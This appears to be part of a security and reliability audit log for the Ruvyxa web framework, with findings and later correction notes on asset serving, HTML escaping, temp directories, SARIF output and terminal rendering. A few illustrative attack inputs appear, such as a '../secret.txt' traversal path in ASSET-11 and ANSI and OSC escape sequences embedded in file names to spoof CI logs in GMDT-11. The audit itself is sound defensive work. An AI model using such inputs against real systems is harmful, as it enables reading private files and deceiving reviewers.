download sending a date-form `If-Range` always restarts from zero. Both hosts agree, so this is a
consistent gap rather than a drift. **Fix:** emit `Last-Modified` from the `AssetIdentity.modified`
already computed, and honour `If-Modified-Since` after the `If-None-Match` check per RFC 9110
§13.1.3 precedence. The value must go through the same `is_settled` reasoning the ETag cache uses,
since one-second mtime granularity is what makes a date validator weak. **Risk:** a
second-granularity date can wrongly answer 304 for a file rewritten inside the same second — the
failure `ASSET_ETAG_SETTLE` was written to avoid; `If-None-Match`-first precedence must be
preserved. **Tests:** date-form `If-Range` cases in `tests/fixtures/byte-range-conformance.json`,
plus a test that a present-but-stale `If-None-Match` beats a matching `If-Modified-Since`.

**Correction (2026-08-30, from implementing this):** the gap is real on the Axum host and the
recommended fix is the right one, but the cross-host claim is backwards. "Both hosts agree, so this
is a consistent gap rather than a drift" is wrong in both directions.

`standalone-server.ts` already emitted `last-modified` on its 200, 206 and 304, already derived it
from the same `(size, mtime)` identity, and already implemented the RFC 9110 §13.1.3 precedence in
`staticResponsePlan` — `if-none-match` first, `if-modified-since` only when no entity tag was sent.
So this was a drift, with `ruvyxa start` the half that was behind, and the fix was to bring Axum up
to what the other host already did rather than to invent a rule for both.

In the other direction, neither JavaScript host implements `If-Range` **at all** — not the
standalone server, not `createHandler`, and `tests/fixtures/byte-range-conformance.json` has no case
for it. That is worse than the missing `Last-Modified` this entry describes: both hosts send an
entity tag and (on the standalone server) a date, so clients do send `If-Range` back, and a server
that ignores it answers a 206 window of a file that may have changed — a resumed download assembled
from two representations, which is a corrupt file rather than a stale one. Fixed here in both hosts.

Implementing the `If-Range` half on the standalone server then exposed a third defect that no
finding names. Measured against Bun 1.4.0: when a handler deliberately answers 200 to a request
carrying `Range`, `Bun.serve` applies its own range handling and rewrites it to a 206 — for a
`BunFile` body **and** for that file's own `.stream()`. The comment in `standalone-server.ts` saying
"Bun leaves a handler's own `content-range` and status alone" is true only while the handler
_answers_ the range, and the declining case is the one that matters. So the corruption `If-Range`
exists to prevent was reintroduced one layer below the decision, on Bun only, invisible to the two
other transports. A byte array is not ranged but buffering the file is the peak-memory failure the
streaming path exists to prevent; a stream Bun does not own is not ranged and still streams, so the
declined-range body is handed over through an identity transform. The three-transport conformance
suite holds all of it.

**ASSET-07 — A `public/` file deleted between `metadata` and `read` produces a 500, not a 404.**
_Reliability._ Two adjacent filesystem observations with two different failure policies: the
existence check treats every failure as a miss and falls through to routing; the read maps every
failure to `RuvyxaError::Io` and `handle_request` turns it into a 500. **Impact:** a transient 500 —
and, in dev, an error overlay — instead of a 404 while a file is being replaced by a
watcher-triggered rebuild or an atomic-save editor, and a permanent 500 for a file with wrong
permissions, where a 404 would be both correct and less alarming. **Fix:** map `ErrorKind::NotFound`
and `PermissionDenied` from the read to `Ok(None)` so the request continues to routing, keeping
`RuvyxaError::Io` for genuinely unexpected kinds. **Risk:** a file that exists but cannot be read
now 404s instead of 500ing, hiding a permissions misconfiguration from the status code; log the
mapped error at `warn` to keep the signal. **Tests:** take `serve_public_file` to the point of the
metadata read, delete the file, and assert `Ok(None)` rather than `Err`.

**ASSET-08 — The streamed document rescans its entire held prefix for `</head>` on every chunk.**
_Performance._ `document_stream.rs:101` searches from index 0 of `held` each time, and `held` grows
by one chunk per loop before the next scan — O(prefix²/chunk_size), bounded by `MAX_HEAD_PREFIX`
(512 KiB). **Impact:** bounded but real CPU on the request path, paid exactly when the page is
already slow to produce a head. In the normal case React writes `</head>` in the first frame and the
cost is one scan, which is why it has not been noticed. **Fix:** keep a `scanned: usize` and search
from `self.scanned.saturating_sub(needle.len() - 1)` so a needle straddling a chunk boundary is
still found, updating `scanned` after each miss and resetting when the head is taken. **Risk:** the
overlap must be exactly `needle.len() - 1`; getting it wrong loses a `</head>` split across chunks,
which the existing tests do not cover. **Tests:** feed `</head>` split across two chunks at every
offset (7 cases) and assert the head is still composed. **Related, same file class:**
`streamed_asset_threshold()` calls `std::env::var` on **every** public-asset request for a
process-lifetime constant that belongs in a `LazyLock<u64>`, which the same file already uses for
`ASSET_ETAG_CACHE`.

**ASSET-09 — `escape_html`, the workspace's single named HTML escaper, does not escape `'`.**
_Security (not exploitable today)._ `html_document.rs:1131` replaces `&`, `<`, `>`, `"` and not `'`,
while its doc comment declares it "the one place that rule lives in the workspace"; it is
re-exported and consumed by `ruvyxa_cli/src/prerender.rs`. Every one of the fifteen call sites was
checked: all are element text or a **double**-quoted attribute, so nothing is injectable as written.
`static_assets.rs` also has a second, private `escape_attribute` with the same four replacements.
**Impact:** none today. The risk is the next single-quoted attribute — the very quoting style
`declares_own_icon` and `document_head_defaults` explicitly expect authors to use — added by someone
who reasonably assumes the workspace's named escaper is context-complete. It is also the escaper a
deployed build's prerendered pages go through, so a miss there is baked into static HTML. **Fix:**
add `.replace('\'', "&#39;")` (not `&apos;`, which HTML 4 does not define) and collapse
`escape_attribute` into a call to it so there is genuinely one implementation. **Risk:** any fixture
asserting exact escaped output containing an apostrophe changes; the JavaScript half in
`entry-templates.mjs` escapes the same values and must gain the same character in the same commit,
or the two hosts emit different bytes for one input. **Tests:** an apostrophe case in the shared
document-head/prerender escaping fixture, so both languages are held to the same character set.

**Correction (2026-08-30, from implementing this):** the character is missing from **three**
implementations, not the two named here. Besides `escape_html` and `static_assets.rs`'s private
`escape_attribute`, the same four replacements are written again as `__ruvyxaEscapeAttribute` inside
the prelude `entry-templates.mjs` generates, and again as `escapeHtmlAttribute` in
`serverless-handler.mjs` — and that last one is the writer a _deployed request-time render_ goes
through, so it is the copy furthest from the escaper this entry calls "the one place the rule
lives". All three now carry `&#39;`, `escape_attribute` is a call to `escape_html`, and an
`escaping` table in `tests/fixtures/document-head-conformance.json` is replayed against all three —
the two JavaScript copies needed `escapeHtmlAttribute` exported before a fixture could reach it at
all, which is itself the reason a copy drifts.

Two further copies were checked and deliberately left alone. `escape_xml` in
`ruvyxa_cli/src/site_discovery.rs` writes XML, where `&apos;` _is_ defined, and it already escapes
the apostrophe. The `<html lang>` rewrite — written twice, in `output.rs`'s `META_LANG_PRELUDE` and
in `entry-templates.mjs` — escapes only `&`, `"` and `<`, and that omission is deliberate,
documented and pinned by an exact-output assertion in `entry-prelude-parity.test.mjs`: it writes
into a double-quoted attribute, where `>` is inert. Bringing those to the five-character set would
have been a change with no defect behind it.

**ASSET-10 — PostCSS scratch directory is a predictable path in the shared system temp directory.**
_Security._ **Confidence: SPECULATIVE.** `postcss.rs:256` builds
`std::env::temp_dir()/ruvyxa-postcss/{pid}-{nanos}` with `create_dir_all`, which succeeds on an
existing directory — so the path is _claimed_ rather than created exclusively, and both name
components are guessable. The project's whole collected stylesheet and a `request.json` naming the
project root are written into it. **What would confirm it:** on a shared host with a world-writable
`/tmp`, pre-create the directory (or a symlink in that position) before a build and observe whether
`create_dir_all` accepts it and whether the attacker can read the files. **What would kill it:**
confirming the deployment model is single-user only. **Impact:** on a multi-tenant host, disclosure
of the compiled global stylesheet and the absolute project root, plus the ability to place content
the PostCSS runner will read. Not a concern on a single-user developer machine, the common case.
`Drop` `remove_dir_all`s the path, which on modern Rust does not follow a symlinked top directory,
so arbitrary deletion is not the exposure. **Fix:**
`tempfile::Builder::new().prefix("ruvyxa-postcss-").tempdir()` — `tempfile` is already a
dev-dependency of this crate and is used by the tests in this very file — which creates with
`O_EXCL` and mode 0700 and cleans up on drop. **Risk:** `tempfile` moves from a dev-dependency to a
dependency, which the workspace's pinning rules should be checked against; the layout inside the
scratch dir is unchanged, so `css-runner.mjs` needs no change. **Tests:** two concurrent
`PostcssRunner::run` calls do not collide, and on Unix the created directory's mode is 0700.

**ASSET-11 — `contained_public_asset` degrades to a textual prefix test when `canonicalize` fails.**
_Security — defence in depth (not currently reachable)._ `normalized_canonical_path` falls back to
the **uncanonicalised** path on error, and `Path::starts_with` compares components — so
`public/../secret.txt` _does_ start with `public` component-wise. If canonicalization failed for the
candidate (an IO error, a path over `MAX_PATH` on a Windows host without long-path support, a
filesystem returning `EIO`) while succeeding for the root, an escaping path would be accepted. Not
reachable today because every caller rejects `..` and `\` before calling it, and `.exists()` already
required the path to resolve. **Impact:** none observed. The cost is that the next caller — a new
endpoint, an adapter, a prerender path — inherits a guard whose safety is not local to it, which is
exactly how the `resolve_client_file` duplication went wrong before. The function name and doc
comment promise more than the body delivers on the error path. **Fix:** return `None` when either
canonicalisation fails — use `std::fs::canonicalize` directly and `without_verbatim_prefix` only on
success — making the guarantee self-contained without changing `normalized_canonical_path`, whose
lenient fallback other callers rely on for diagnostics. **Risk:** a path that exists but cannot be
canonicalised now fails to serve; given `.exists()` already succeeded, that should be vanishingly
rare. **Tests:** `contained_public_asset(root, &root.join("..").join("secret.txt"))` is `None` even
when `secret.txt` exists — which today passes for the wrong reason and after the fix passes for the
right one.

**ASSET-12 — The sync serving fallbacks are a weaker second copy of the serving rules, and they are
what `test:parity` exercises.** _Maintainability._ `serve_public_file_sync` sets no ETag, no
`Cache-Control`, no `Accept-Ranges`, answers no conditional or range request, never streams, and
returns `Err` for a missing file — five behaviours its async counterpart has. Its only reachable
callers are `bench.rs` and `commands.rs`'s `smoke_render_side`, the `test:parity` command.
**Impact:** no runtime impact. It matters because `test:parity` is the command that is supposed to
prove a route renders the same under both hosts, and it drives the copy that answers none of the
caching or range questions the real host answers — the last three header rules added to
`serve_public_file` are not covered by the parity check at all. **Fix:** delete both `*_sync`
functions and have `render_request_cached` call the async ones through `block_on`, so there is one
implementation of the serving rules. If a sync path must remain, rename it to say what it is and
document that its headers are deliberately not the served ones. **Risk:** `block_on` from inside an
existing tokio runtime panics, so the call site must be checked — `render_request_cached` is invoked
from `ruvyxa_cli` synchronously, outside any runtime, which is the case that works. **Tests:**
whatever replaces them is covered by the existing conditional/range tests, which would then apply to
the parity path too — the point of the consolidation.

**Correction (2026-08-30, from implementing this):** the consolidation is right and the risk note is
wrong, in the way that would have shipped a panic. The entry says "`render_request_cached` is
invoked from `ruvyxa_cli` synchronously, outside any runtime, which is the case that works". It is
not: `ruvyxa test:parity` calls it from **inside** a Tokio runtime, and `Runtime::block_on` panics
when a runtime is already active on the thread. The straightforward reading of this entry — delete
the sync copies, call the async ones through `block_on` — panics on every route the parity command
renders.

That was caught only because the first implementation detected an active runtime and returned an
error rather than blocking, which turned a panic into 30 legible failures from a real
`test:parity --root examples/demo` run. The shipped bridge blocks in place when no runtime is active
— the prerender and `bench` case, one call per route — and moves the future to a scoped thread with
no runtime context when one is, which is the only arrangement both callers survive. `test:parity`
now passes for all 30 demo routes _through the real serving rules_, which is the point of the
finding: the five behaviours it lists as missing from the sync copies are now the ones the parity
command exercises.

## CLI build, prerender, artifact cache

**CLIB-07 — An unreadable client manifest silently produces pre-rendered documents with no hydration
script, on a green build.** _Reliability._ `load_prerender_client_assets` has three fail-soft
`let … else` returns, and an empty map makes `inject_prerender_client_assets` return the document
unchanged. The sibling `write_style_asset` was hardened against exactly this class with the opposite
answer, and its comment explains why: "parsing a damaged file as `{"routes": []}` did not merely
lose the error — it _replaced_ the manifest with one naming no routes … a build interrupted
mid-write leaves one, and so do two builds sharing an output directory." **Impact:** low likelihood
— the file is written a few statements earlier in the same process — but the failure is total and
silent: every SSR-rendered page is written with no bootstrap block and no `<script type="module">`,
the build reports success, and the deployed site renders correctly and is completely
non-interactive. `output_audit` cannot catch it either: a document that references _nothing_ has no
dangling reference. **Fix:** return `anyhow::Result<BTreeMap<…>>` — a missing file is still an empty
map (a server-only or bundle-less build is legal), but an unreadable or unparseable one is an error
naming the path. **Risk:** `prerender_not_found_document` deliberately passes an empty map and must
keep working; only the file-backed loader changes. **Tests:** write a truncated
`client/manifest.json` and assert the prerender phase fails naming the file rather than emitting
script-less documents.

**Correction (2026-08-30, from implementing this):** the finding is right about
`load_prerender_client_assets` and understates its reach — **the rule is written four times over the
same file**, and the CLI loader was one of the two that had it wrong. `prebuilt_client_assets` in
`crates/ruvyxa_dev_server/src/html_document.rs` already separates absent from unreadable with a
three-state `ClientManifest` enum and logs the difference, and `read_cache_observation` in
`crates/ruvyxa_cli/src/bench.rs` already refuses to report a measurement it could not read. The
fourth is `loadClientAssets` in `packages/ruvyxa/runtime/adapter-runner.mjs`, which had the
identical `catch { return new Map() }` and is the reader for the **deployed** half of the same
build: a damaged report there makes the emitted route registry compose markup with no bootstrap
block and no `<script type="module">`, so every live-rendered page in the deployment answers 200 and
never hydrates. Both were fixed, both with a missing file still meaning an empty map.
`client/manifest.json` in **Tests** is the file's old path; it is `client-report.json` at the build
root now.

**CLIB-08 — The final `build.json` is rewritten in place after the atomic commit.** _Reliability._
`build.rs:1268` is a plain `fs::write` over a file the commit has already moved into place,
contradicting the module contract ("Output never lands in place incrementally"). Two fields —
`totalMs` and `adapterArtifacts` — are only knowable after the commit and the adapter stage, so the
document is written twice. **Impact:** small. A truncated `dist/build.json` makes `ruvyxa start` and
every adapter that parses it fail on an otherwise complete build, with no indication that the build
itself was fine. The window is one small write. **Fix:** use
`ruvyxa_bundler::atomic_file::write_atomic`, the same helper `artifact_cache` already uses, so the
file is either the old complete document or the new one. **Risk:** none material — `write_atomic`
writes a temp file beside the target and renames, which `commit_staged_build_outputs` already relies
on working in this directory. **Tests:** not worth a dedicated test; covered by making the write
atomic.

**CLIB-09 — Every prerender input path is canonicalized twice per job.** _Performance._
`stable_prerender_inputs` normalizes each input, and `store_prerender_artifact` maps
`normalized_canonical_path` over the same already-canonical paths; `normalized_canonical_path` is a
syscall every time. The same double applies in `prerender_not_found_document` and
`store_server_component_entry`. **Impact:** `2 × modules_per_route` `canonicalize` syscalls per
cache-missing job — for a dynamic route expanded to thousands of paths each with a few hundred
modules, millions of redundant syscalls, and `canonicalize` is the expensive filesystem call on
Windows. No correctness effect. **Fix:** drop the `.map(normalized_canonical_path)` in
`store_prerender_artifact` and document that callers pass canonical paths — both already do.
Alternatively memoize canonicalization in `ArtifactFingerprintCache`, already the per-build memo for
exactly this kind of repeated filesystem question. **Risk:** `store_server_component_entry` takes
its inputs straight from the worker response and _does_ need the normalization, so the two stores
must not be changed together without checking each caller. **Tests:** extend
`prerender_artifact_cache_reuses_and_invalidates_dependency_content` to store from already-canonical
inputs and assert the cache still validates.

**Correction (2026-08-30, from implementing this):** "callers pass canonical paths — both already
do" was not quite true, and the exception is why the redundant call had cover.
`stable_prerender_inputs` canonicalizes on its main branch, but the branch that remaps a path out of
the staging tree rebuilt its answer as `root.join(relative)` — `root` being the `--root` value
exactly as the CLI received it rather than the canonical project root it had already computed one
line above. That branch therefore returned an unresolved path, and `store_prerender_artifact`'s
second `normalized_canonical_path` was what quietly repaired it. Dropping the store-side call alone
would have moved a cache key. The branch is normalized like the one beside it now, which reproduces
the previous stored key byte for byte, and
`stable_prerender_inputs_are_canonical_even_when_remapped_out_of_staging` holds it. The memoization
alternative was deliberately **not** taken: a per-build memo of `canonicalize` answers a filesystem
question whose answer can change while the build runs, and that deserves its own decision rather
than riding along with a redundancy removal. Only `store_prerender_artifact` changed;
`store_server_component_entry` still normalizes, as the finding's **Risk** requires.

## CLI commands, config, discovery

**CLIC-05 — A malformed `site.url` is a hard config error under `build` and silently swallowed under
`dev`.** _Reliability._ `resolve_site_url` returns `Result<Option<String>, String>` and takes real
trouble to name which of five sources supplied the bad value; `build` propagates it and `dev` writes
`.ok().flatten()`, collapsing `Err(...)` and `Ok(None)` into the same `None`. Downstream,
`write_discovery_files` takes the `None` branch and sets `sitemap_needs_site_url`, which the dev
observer never reads — so nothing is printed. **Impact:** a project debugging its sitemap under
`ruvyxa dev` — the exact workflow the dev discovery observer was added for — gets a 404 with no
signal that its `site.url` is the problem, and looks at the route table. **Fix:** match on the
`Result` and print the error through `warn_text` the way the observer prints its other two failures,
before falling back to `None`. **Risk:** none; the resolved value is unchanged and only a message is
added. Do not promote it to a hard error without deciding whether `ruvyxa dev` should refuse to
start over a sitemap origin. **Tests:** a unit test asserting an invalid `site.url` still produces a
config.

**CLIC-06 — `build_dependency_hash` fabricates an empty environment when `.env` cannot be read, and
`check-silent-defaults.mjs` structurally cannot see it.** _Reliability._
`ruvyxa_dev_server::project_env(root).unwrap_or_default()` — twenty lines from the same call
propagated with `?`. `project_env` returns `Err` only when a `.env` exists and cannot be read
(absence is a `continue`), so this maps "I could not open it" onto the identical hash as "there is
none". The guard script cannot match it: its `FALLIBLE` pattern lists `read_to_string`, `fs::read(`,
`from_str`, `from_slice`, `from_utf8`, `.parse::<`, `.parse()` — and `project_env(root)` is none of
them, so the line never reaches the `FABRICATE` test even though `unwrap_or_default()` is right
there. **Impact:** the whole compile cache, artifact graph, client route artifacts and shared-chunk
artifacts key on a hash that cannot tell an unreadable `.env` from an absent one — while the
function's own doc comment explains at length that under-keying "serves a bundle built from an
environment the project no longer has, which is what this fixes." The guard gap is the more durable
part: any future `unwrap_or_default()` on a read reached through a helper is equally invisible.
**Fix:** make `build_dependency_hash` return `Result` and propagate — `load_project_config` is
already fallible and the sibling `adapter_runner_env` already propagates the same call for the same
reason. If a failure must not stop config loading, fold the _error_ into the hash as a distinct
marker so the two states cannot collide. Separately widen the script's `FALLIBLE` to cover the
project's own fallible readers. **Risk:** propagating makes `ruvyxa build` fail on an unreadable
`.env`; on Windows a transiently locked `.env` would newly fail a build, so a retry or an explicit
sharing-mode read may be wanted first. **Tests:** a case with an unreadable `.env` asserting the
hash differs from the no-`.env` hash.

**CLIC-07 — `plugin-transforms.json` grows monotonically and is never pruned.** _Performance._
`remembered_transformed_modules` merges the stored set with the current one and writes it back
unfiltered, so an entry only leaves when the dependency hash changes. Each surviving entry is then
re-examined every build by `transform_differs_by_environment`, which reads the file and calls the
plugin hook twice — serial NDJSON round-trips through a single `Mutex`-guarded worker, each carrying
the module's full source. A module deleted from the project is never removed: `read_to_string`
fails, the filter answers `false`, and the path is still written back. **Impact:** not correctness —
a stale entry produces no warning. The cost is per-build and grows without bound within a
config-hash generation: file reads plus 2N serial worker round-trips. For a large plugin-using
project this is the "warm build got slower and nobody knows why" that `bench` would notice and not
attribute. **Fix:** filter the merged set by `module.is_file()` before writing the record back — a
single `stat` per entry, replacing an unbounded read plus two hook calls. Keeping the filter at the
write site preserves the merge semantics the comment argues for. **Risk:** a temporarily absent
module (mid-rename, a generated file not yet written) is forgotten and its warning disappears for
one build. **Tests:** write a store naming a nonexistent path, call the function, and assert the
rewritten store no longer names it.

**CLIC-08 — `cli_args.rs` documents two argument normalisations it does not implement.**
_Maintainability._ The module doc promises `--root=x`, an em-dash `—root`, and `test-parity` for
`test:parity`. Only the first exists: `normalized_option_arg` strips a literal ASCII `--` and
returns `None` for an em dash, and `canonical_command_name` maps sixteen spellings without
`test-parity`. The test coverage matches the code rather than the doc. **Impact:** no user-facing
defect — clap's error for an unrecognised spelling is correct and actionable. The cost is to the
next change: the doc is the authority a reader consults before adding a spelling, and it claims
coverage that does not exist, so a reader debugging a rejected `test-parity` would look for a bug in
`normalize_command_arg` rather than add the alias. Filed because the file explicitly positions
itself as the contract. **Fix:** either implement both (add the alias; normalise a leading
U+2014/U+2013 to `--` before the `strip_prefix`) or delete the two clauses from the module doc.
**Risk:** em-dash normalisation touches every argument including positional ones, so restrict the
rewrite to arguments that also match a known option name — which `canonical_option_name` already
gates. **Tests:** `test-parity` resolves to `Command::TestParity`; `—root x` resolves to `--root x`.

**CLIC-09 — `capability_parity` maps every unrecognised plugin capability id onto `presence@1`, so
the failure the axis exists for cannot fire.** _Reliability._ `commands.rs:912` writes
`if id == "realtime@1" { "realtime@1" } else { "presence@1" }`, discarding what the plugin actually
claimed — so the "unlisted capability" failure fifteen lines below, whose comment says "one that is
not has never been checked against the deployed runtime, which is exactly how server actions came to
work locally and 404 everywhere else", can never be reached through this loop. **What holds it up
today:** the id is validated on the JavaScript side first — `plugin-http.mjs` has a two-entry
allowlist and `claim` throws on anything else, and `PluginNativeCapability` is the matching
two-member union. So this is unreachable, not broken. **Impact:** none today. It is a load-bearing
safety net that is wired shut, in a check whose own comment explains that a missing entry here is
how server actions shipped 404ing on every deployment. The next capability added is the one that
pays. **Fix:** pass the id through unchanged — the tuple's first element becomes an owned `String`,
and both the `find` and the `println!` already treat it as text. **Risk:** a malformed `describe`
response with an empty id currently reports `presence@1` and would newly report the empty string and
fail the parity check — the correct answer, but a new failure for that input; guard with
`filter(|id| !id.is_empty())` if that matters. **Tests:** feed a capability id absent from the
fixture and assert a failure is produced; the seam does not exist today, so extracting the
contract-matching half into a testable function is part of the fix.

**CLIC-10 — `ruvyxa clean` leaves the config cache and generated route types behind for any project
with a non-default `outDir`.** _Reliability._ `clean` removes exactly
`args.root.join(config.out_dir())` and reports `removed`, while `ROUTE_TYPES_PATH` is hardcoded
`.ruvyxa/types/routes.d.ts` and `config_cache_path` is hardcoded `.ruvyxa/cache/config-load.json`.
The config cache's exception is argued for and correct — it cannot read `outDir` because reading
`outDir` is what it exists to avoid. `ROUTE_TYPES_PATH` has no such reason. Note the discovery
directory _does_ follow `outDir`, so the placement rule is not uniform. **Impact:** small and mostly
cosmetic — the config cache is content-validated against the toolchain version and every recorded
input's hash, so a survivor is not served stale, and route types are regenerated by
`dev`/`build`/`check`. What is wrong is the report: `clean` says `removed` while state remains, and
a user reaching for `clean` to escape a bad cache does not get what the command claims. It is also
the only escape hatch from CLIC-02 for a default-`outDir` project. **Fix:** also remove
`root.join(".ruvyxa")` when `config.out_dir() != ".ruvyxa"`, and print both paths. Both are inside
the project root and derived from it, but the second is a literal and must not be built from
anything configurable. **Risk:** a project deliberately keeping something of its own under `.ruvyxa`
while building elsewhere would lose it — unusual, since the directory is framework-owned by name,
but the fix widens what `clean` deletes and deserves a changelog line. **Tests:** run `clean` on a
project with `outDir: "dist"` and assert both directories are gone.

**CLIC-11 — `raw_image_urls` is a hand-rolled source scanner that bypasses both sanctioned ones.**
_Maintainability._ `image_usage.rs:121` walks `.tsx`/`.jsx`/`.ts`/`.js`/`.mdx`/`.md` line by line
looking for `<img` and then a quoted attribute value, with no awareness of comments, string
literals, template literals, or escapes. `ast.rs` exposes `skip_non_code`, which is what this loop
is missing. **Impact:** bounded and much smaller than the trap's usual shape, which is why it is
Low: the module states its contract as "It reports, never fails: a raw `<img>` is legal, and some
are deliberate", the result is a build advisory, and an 8 KiB saving floor suppresses most noise — a
false positive costs a developer a look at a commented-out line. The reason to record it is that
this is the fifth-plus instance of a pattern the repository has a written rule against, and a future
edit that gives this scanner a harder consequence inherits the blindness silently. **Fix:** route
the scan through `ast::skip_non_code` (or mask comments and string literals with it first) before
searching for `<img`. If that is not practicable for JSX markup, add a comment naming the rule and
stating why this is an accepted exception — the file's existing comments already acknowledge two
limitations, so a third is in keeping. **Risk:** masking changes which lines are reported; the three
existing tests pin the current answers and would need a comment case added rather than changed.
**Tests:** add `// <img src="/logo.png" />` and a template-literal occurrence, asserting neither is
reported.

## Route graph, middleware, diagnostics, TUI

**GMDT-09 — Route discovery and the intercepting-route refusal silently swallow every directory-walk
error.** _Reliability._ `.filter_map(std::result::Result::ok)` in `discover_routes`,
`reject_intercepting_routes`, and `intercept_pages`, plus
`let Ok(entries) = fs::read_dir(level) else { return … }` in two more — `WalkDir` reports per-entry
errors as `Err` items, and discarding them treats "I could not look" as "there is nothing there."
**Impact:** three silent outcomes. A route directory that cannot be read simply does not exist as
far as the build is concerned — no `RUV1001`, no warning, and a 404 in production. In
`reject_intercepting_routes` the _refusal_ is what is skipped, so an intercepting-route folder in an
unreadable subtree passes validation and can mount a publicly reachable page at a URL the author
never meant to publish — the exact defect that function's own doc comment describes. In
`intercept_pages` an interception silently disappears. **Fix:** collect walk errors and surface
them, either as a `RUV1001` variant naming the unreadable path or at minimum a `tracing::warn!`;
`discover_routes` already returns `Result`, so failing hard on an unreadable directory under `app/`
is available and is the honest behaviour. **Risk:** a project with an unreadable stray directory
under `app/` (a mounted volume, a `.git` worktree artifact, an antivirus-locked file on Windows)
starts failing a build that previously succeeded; warning rather than failing is the low-risk half.
**Tests:** on Unix, a `chmod 000` subdirectory under a temporary `app/` asserting the walk reports
rather than silently skips, gated `#[cfg(unix)]`.

**Correction (2026-08-30, from implementing this):** the class is **nine** sites, not five. Beyond
the three `WalkDir` `filter_map(Result::ok)` calls and the two `let Ok(entries) = fs::read_dir(...)`
guards, the two `read_dir` iterations each dropped their own per-entry errors with a second
`filter_map(Result::ok)`, and each then asked `entry.file_type().is_ok_and(|kind| kind.is_dir())` --
a `stat` that can fail on its own and whose failure was answered with "not a directory", the same
silent skip one level further down. All nine report now. The behaviour chosen is the hard one the
finding calls honest, under a new `RUV1021`, because `RUV1001` already means "app directory was not
found" and giving it a second meaning is what `one_diagnostic_code_carries_one_meaning` exists to
refuse. The finding also stops at the Rust half: `collectIntercepts` in
`packages/ruvyxa/runtime/route-intercepts.mjs` is the `ruvyxa dev` twin of `route_intercepts`, and
both of its `readdirSync` calls carried the same `catch { return [] }` -- so fixing only Rust would
have left `ruvyxa dev` silently dropping a modal that `ruvyxa build` now refuses to build. Both
halves report, each with a test that walks a directory which is not there: the portable stand-in for
one that cannot be read, since a permission bit is not.

**GMDT-10 — Absolute developer paths are written into the SARIF report.** _Security._ Two
independent paths: the `locations` block relativises but falls back to the absolute path when
`strip_prefix` fails, and the `message` block is never relativised at all — while route diagnostics
interpolate absolute paths straight into `explanation` (RUV1013, and RUV1003 with two). **Impact:**
SARIF is meant to be uploaded — to GitHub code scanning, to a vendor dashboard. The uploaded report
discloses the developer's or CI runner's directory layout, usernames in home-directory paths, and
internal project names in sibling-workspace paths. `normalized_canonical_path` also resolves
symlinks, so a module reached through a workspace `file:` link or a package store outside the
project root escapes `strip_prefix` and leaks its absolute path in `artifactLocation.uri` too. Low
because it is layout information rather than credentials, and SARIF upload is an explicit user
action. **Fix:** apply the same root-relative rewrite to `message` and to the `importChain`
property, and when `strip_prefix` fails emit the basename or an `<outside-project>/…` placeholder
rather than the absolute path. **Risk:** a terminal reader loses the copy-pasteable absolute path
from the explanation; `Display for Diagnostic` is a separate renderer and should keep them — only
the SARIF serializer changes. **Tests:** extend
`sarif_uses_project_relative_locations_and_deduplicates_rules` with a diagnostic whose `explanation`
contains an absolute path under the root, and one whose `span.file` is outside the root asserting no
absolute path appears anywhere in the serialized JSON.

**Correction (2026-08-30, from implementing this):** four fields, not two. `rules[].fullDescription`
carries the first diagnostic's `explanation` verbatim, so it discloses everything `message` does,
and `rules[].help` carries `suggested_fix` the same way; the test written here found both on its
first run. The `<outside-project>/...` placeholder also had to be paired with a raw-spelling attempt
at `strip_prefix` beside the canonical one, or a project living under a symlinked directory has
_every_ file escape the root and gets the placeholder for all of them. One boundary is worth
recording rather than pretending away: a path in prose is reached either because the diagnostic also
carries it structurally -- its `span` or its `import_chain`, which is how `RUV1013` and `RUV1003`
both reach -- or because the project root prefixes it. An absolute path from outside the project
that no field records stays, because finding it would mean guessing which runs of text in a sentence
are paths, and on a platform where `/` opens both an absolute path and every URL this framework
prints, that guess is not available.

**GMDT-11 — Filesystem paths reach the terminal unfiltered between ANSI escapes.** _Security._
`theme.rs:282`'s `paint_when` wraps the value in `\x1b[{code}m…\x1b[0m` with no C0 or ESC filtering
anywhere in the crate, and repository file paths reach it directly — `commands.rs:57` passes a path
from `discover_routes` into the route table. **Impact:** the realistic vector is CI. `ruvyxa check`
running on a pull request from a fork prints discovered route paths; a filename carrying `\x1b[2J`,
an OSC title-set sequence, or a run of newlines and fake `✓` glyphs can rewrite what a human
reviewer sees in the log — hiding a failure or forging a pass. Locally it is terminal manipulation
on a repository the developer already cloned, a lower bar than the code they are about to build.
Windows forbids control characters in filenames, so it is not reachable there. **Fix:** filter
inside `paint_when` — replace any byte below `0x20` other than `\t`, plus `0x7f`, with U+FFFD or a
visible escape. Doing it there covers `path_text`, `label`, `dim`, `accent`, and every role.
`Gradient::render`/`cell` need the same treatment, since they emit escapes around per-character text
without going through `paint_when`. **Risk:** almost none for real content; watch that the
tab-preserving carve-out is present, since `format_duration` and table cells may contain tabs.
**Tests:** `path_text` over a path containing `\x1b` emits no `\x1b` other than the two the styling
itself adds; same for `Gradient::paint_with`.

**Correction (2026-08-30, from implementing this):** filtering inside `paint_when` does not cover
"every role" the way the finding says, in two directions. It has to filter on **both** branches:
`paint_when` returns the value untouched when `color` is false, and colour is off in a redirected CI
log, which is the case the vector is aimed at. And it is not the only door: `print_box_row` takes
cells the caller has already styled, and `ruvyxa routes` passes the route `path` column exactly as
it came out of discovery, through no role at all. So there are two filters. A strict one runs inside
`paint_when` and inside `Gradient`, where nothing has a legitimate control character; an
SGR-preserving one runs at the writer every durable line now goes through, where the escapes the
framework just added are legitimate and everything else -- an erase, a cursor move, an OSC title
set, a bare C1 `0x9B` -- is not.

**GMDT-12 — Every TUI print panics on a broken pipe.** _Reliability._ Every durable line goes out
through `println!`/`print!` — `print_field`, `print_table_rule`, `print_box_row`, `print_section`,
`print_phase`, `print_header`, `print_success_banner_at` — and Rust's `println!` panics when the
underlying write fails. The transient frames are already careful (`eprint!` followed by an ignored
flush); the durable ones are not. A workspace-wide search found no mitigation: no `SIGPIPE`
restoration, no `signal_hook`, no `std::panic::set_hook`. **Impact:** piping any Ruvyxa command into
`head`, `less` (quit early), `grep -q`, or a CI log collector that closes early produces a panic
message and a non-zero exit instead of a clean stop — `ruvyxa check | grep -q RUV` reports failure
for the wrong reason. Low: it is standard Rust CLI behaviour and nothing is corrupted, but it is a
first-impression defect in a tool whose terminal output is otherwise this carefully made. **Fix:**
route durable output through one helper that writes to a locked `io::Stdout` and treats
`ErrorKind::BrokenPipe` as a clean stop. Restoring the default `SIGPIPE` disposition is a one-liner
but is `unsafe` and Unix-only; the helper also fixes Windows. **Risk:** swallowing write errors
hides a genuinely full disk when stdout is redirected to a file — ignore only `BrokenPipe`.
